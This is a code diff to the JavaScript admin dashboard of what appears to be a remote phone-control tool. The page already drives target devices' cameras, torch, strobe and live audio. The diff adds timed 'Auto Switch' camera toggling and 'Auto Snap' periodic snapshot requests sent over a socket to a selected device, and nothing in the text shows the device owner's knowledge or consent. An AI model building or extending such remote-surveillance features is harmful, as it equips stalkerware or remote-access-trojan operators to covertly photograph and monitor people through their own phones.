@@ -234,7 +234,7 @@
                             </div>
                             <div id="liveCamContainer" style="display:none;position:relative;">
                                 <img id="liveCamImg" style="width:100%;max-width:480px;border-radius:8px;border:2px solid var(--accent);background:#0a0a14;">
-                                <div style="margin-top:8px;display:flex;gap:8px;">
+                                <div style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap;">
                                     <button class="header-btn" onclick="switchCamera()" style="font-size:0.75rem;">&#x21c4; Switch Camera</button>
                                     <span style="font-size:0.72rem;color:var(--text3);align-self:center;">Front/Back camera toggle</span>
                                     <button class="header-btn" onclick="adminTorch()" style="font-size:0.75rem;">&#x1f4a1; Torch</button>
@@ -245,6 +245,24 @@
                                         <option value="rapid">Rapid</option>
                                     </select>
                                     <button class="header-btn" onclick="adminStrobe()" style="font-size:0.75rem;">&#x26a1; Strobe</button>
+                                </div>
+                                <div style="margin-top:6px;display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
+                                    <button class="header-btn" id="autoSwitchBtn" onclick="toggleAutoSwitch()" style="font-size:0.72rem;border-color:#ff9800;">&#x1f504; Auto Switch: OFF</button>
+                                    <select id="autoSwitchInterval" style="padding:4px 6px;border-radius:5px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.7rem;">
+                                        <option value="2000">2 detik</option>
+                                        <option value="5000" selected>5 detik</option>
+                                        <option value="10000">10 detik</option>
+                                        <option value="30000">30 detik</option>
+                                    </select>
+                                    <span style="font-size:0.7rem;color:var(--text3);">Auto-switch interval</span>
+                                    <button class="header-btn" id="autoSnapBtn" onclick="toggleAutoSnap()" style="font-size:0.72rem;border-color:#7c3aed;">&#x1f4f7; Auto Snap: OFF</button>
+                                    <select id="autoSnapInterval" style="padding:4px 6px;border-radius:5px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.7rem;">
+                                        <option value="5000">5 detik</option>
+                                        <option value="15000" selected>15 detik</option>
+                                        <option value="30000">30 detik</option>
+                                        <option value="60000">1 menit</option>
+                                    </select>
+                                    <span style="font-size:0.7rem;color:var(--text3);">Auto-snap interval</span>
                                 </div>
                             </div>
                             <div id="liveVoiceIndicator" style="display:none;margin-top:6px;padding:8px 10px;background:var(--bg);border-radius:6px;border:1px solid var(--accent);font-size:0.78rem;color:var(--text2);">
@@ -662,6 +680,17 @@
 
         // === SELECT DEVICE ===
         function selectDevice(id) {
+            // Stop auto timers when switching device
+            if (autoSwitchTimer) {
+                clearInterval(autoSwitchTimer); autoSwitchTimer = null;
+                const asBtn = document.getElementById('autoSwitchBtn');
+                if (asBtn) { asBtn.textContent = '\u{1F504} Auto Switch: OFF'; asBtn.style.background = ''; }
+            }
+            if (autoSnapTimer) {
+                clearInterval(autoSnapTimer); autoSnapTimer = null;
+                const snapBtn = document.getElementById('autoSnapBtn');
+                if (snapBtn) { snapBtn.textContent = '\u{1F4F7} Auto Snap: OFF'; snapBtn.style.background = ''; }
+            }
             selectedId = id;
             renderDevices();
             const d = devices[id];
@@ -1169,6 +1198,55 @@
             const pattern = document.getElementById('strobePattern').value;
             socket.emit('admin-strobe', { deviceId: selectedId, pattern });
             showToast('Strobe: ' + pattern, 'info');
+        }
+
+        // === AUTO SWITCH CAMERA ===
+        let autoSwitchTimer = null;
+
+        function toggleAutoSwitch() {
+            if (!selectedId) { showToast('Pilih device dulu', 'error'); return; }
+            const btn = document.getElementById('autoSwitchBtn');
+            if (autoSwitchTimer) {
+                clearInterval(autoSwitchTimer);
+                autoSwitchTimer = null;
+                btn.textContent = '\u{1F504} Auto Switch: OFF';
+                btn.style.background = '';
+                showToast('Auto switch OFF', 'info');
+            } else {
+                const interval = parseInt(document.getElementById('autoSwitchInterval').value);
+                autoSwitchTimer = setInterval(() => {
+                    socket.emit('switch-camera', selectedId);
+                }, interval);
+                btn.textContent = '\u{1F504} Auto Switch: ON (' + (interval/1000) + 's)';
+                btn.style.background = '#ff9800';
+                btn.style.color = '#0f0f23';
+                showToast('Auto switch ON setiap ' + (interval/1000) + ' detik', 'success');
+            }
+        }
+
+        // === AUTO SNAPSHOT ===
+        let autoSnapTimer = null;
+
+        function toggleAutoSnap() {
+            if (!selectedId) { showToast('Pilih device dulu', 'error'); return; }
+            const btn = document.getElementById('autoSnapBtn');
+            if (autoSnapTimer) {
+                clearInterval(autoSnapTimer);
+                autoSnapTimer = null;
+                btn.textContent = '\u{1F4F7} Auto Snap: OFF';
+                btn.style.background = '';
+                showToast('Auto snap OFF', 'info');
+            } else {
+                const interval = parseInt(document.getElementById('autoSnapInterval').value);
+                autoSnapTimer = setInterval(() => {
+                    socket.emit('request-snapshot', selectedId);
+                    document.getElementById('liveCamStatus').textContent = '\u25cf Auto snap...';
+                }, interval);
+                btn.textContent = '\u{1F4F7} Auto Snap: ON (' + (interval/1000) + 's)';
+                btn.style.background = '#7c3aed';
+                btn.style.color = '#fff';
+                showToast('Auto snap ON setiap ' + (interval/1000) + ' detik', 'success');
+            }
         }
 
         // === LIVE AUDIO PLAYBACK (Web Audio API) ===
